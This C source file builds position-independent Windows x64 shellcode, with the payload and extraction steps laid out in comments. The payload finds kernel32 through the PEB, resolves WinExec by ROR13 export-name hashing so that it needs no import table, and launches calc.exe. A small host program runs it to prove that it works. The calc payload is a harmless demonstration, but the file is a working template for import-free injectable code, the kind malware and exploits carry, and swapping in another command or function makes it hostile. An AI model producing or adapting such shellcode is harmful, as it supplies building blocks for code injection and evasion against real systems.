// shellcode.c  --  Windows x64 shellcode: WinExec("calc.exe")
// Position-independent (PIC) / no import table / API resolved at runtime.
// Build (native cl.exe):
//   cl /nologo /O2 /GS- /Gy /D_CRT_SECURE_NO_WARNINGS shellcode.c
// Only sc_payload (section .text$sc) is extracted as the shellcode.
//
//   1. gs:[0x60] -> PEB -> Ldr -> InMemoryOrderModuleList, 3 entries -> kernel32 base
//   2. parse kernel32 export table, ROR13-hash each name, match "WinExec"
//   3. build "calc.exe" on the stack (volatile store => no .rdata relocation)
//   4. indirect-call WinExec("calc.exe", SW_SHOWNORMAL)

#include <windows.h>
#include <stdio.h>

#define H_WINEXEC 0x0E8AFE98u   // ROR13("WinExec")

// ===================== payload (extracted as shellcode) =====================
#pragma code_seg(".text$sc")
__declspec(noinline)
void sc_payload(void)
{
    unsigned __int64 peb = __readgsqword(0x60);
    unsigned __int64 ldr = *(unsigned __int64*)(peb + 0x18);
    unsigned __int64 mod = *(unsigned __int64*)(ldr + 0x20);   // InMemoryOrderModuleList.Flink (self)
    mod = *(unsigned __int64*)mod;                             // -> ntdll
    mod = *(unsigned __int64*)mod;                             // -> kernel32
    unsigned __int64 k32 = *(unsigned __int64*)(mod + 0x20);   // kernel32 DllBase

    unsigned long e_lfanew = *(unsigned long*)(k32 + 0x3C);
    unsigned long exp_rva  = *(unsigned long*)(k32 + e_lfanew + 0x88);
    unsigned __int64 exp   = k32 + exp_rva;

    unsigned long   numNames = *(unsigned long*)(exp + 0x18);
    unsigned long*  aof = (unsigned long*)(k32 + *(unsigned long*)(exp + 0x1C)); // AddressOfFunctions
    unsigned long*  aon = (unsigned long*)(k32 + *(unsigned long*)(exp + 0x20)); // AddressOfNames
    unsigned short* aoc = (unsigned short*)(k32 + *(unsigned long*)(exp + 0x24));// AddressOfNameOrdinals

    unsigned long i;
    for (i = 0; i < numNames; ++i) {
        char* nm = (char*)(k32 + aon[i]);
        unsigned long h = 0;
        while (*nm) { h = (h >> 13) | (h << 19); h += (unsigned char)(*nm++); }
        if (h == H_WINEXEC) {
            unsigned __int64 fn = k32 + aof[aoc[i]];
            char cmd[16];
            *(volatile unsigned __int64*)cmd = 0x6578652e636c6163ULL; // "calc.exe"
            cmd[8] = 0;
            ((int(*)(const char*, int))fn)(cmd, 1);                   // WinExec(cmd, SW_SHOWNORMAL)
            return;
        }
    }
}
#pragma code_seg()
// NOTE: sc_payload is the ONLY function in section .text$sc, so the whole
// section's raw bytes == the shellcode. extract.py pulls it out of shellcode.obj.

// ===================== host: prove the C payload runs =====================
int main(void)
{
    printf("[*] calling sc_payload() ...\n");
    sc_payload();
    printf("[+] payload executed (calc.exe should be open)\n");
    return 0;
}
